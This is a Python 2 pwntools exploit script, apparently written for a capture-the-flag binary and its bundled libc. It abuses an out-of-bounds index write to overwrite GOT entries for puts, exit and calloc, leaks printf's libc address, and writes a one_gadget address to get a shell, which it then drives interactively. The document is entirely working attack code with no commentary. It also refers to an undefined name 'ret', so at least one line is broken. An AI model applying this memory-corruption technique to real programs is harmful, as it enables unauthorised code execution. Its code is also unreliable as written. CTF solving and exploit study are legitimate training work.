#!/usr/bin/env python2
from pwn import *
import time

exe = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break main
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

main = 0x400737
call_rax = 0x4005c8
one_gadget = 0xe6c81

printf = libc.symbols["printf"]
printf_plt = exe.plt["printf"]
printf_got = exe.got["printf"]
exit_got = exe.got["exit"]
calloc_got = exe.got["calloc"]
puts_got = exe.got["puts"]

def overwrite(src,dest,val=-1):
    reu("n = ")
    sl(str(val))
    reu("i = ")
    sl(str(dest/4))
    reu("] = ")
    sl(str(src))

overwrite(main,puts_got)
overwrite(call_rax,exit_got)
overwrite(printf_plt,calloc_got)
overwrite(0,calloc_got-main-105,main+109)
overwrite(ret,exit_got-main-109,main+109)

reu("n = ")
sl(str(printf_got))
leak = unpack(re(6),48)-printf
log.info("Libc leak -> "+hex(leak))
one_gadget = hex(leak+one_gadget)
log.info("one_gadget -> "+one_gadget)

reu("i = ")
sl(str((exit_got-6)/4))
reu("] = ")
sl(str(0x5c80000))

overwrite(int(one_gadget[:6],16),calloc_got-main-105,main+109)
overwrite(int(one_gadget[6:],16),calloc_got-main-109,main+109)

reu("n = ")
sl(str(0))

io.interactive()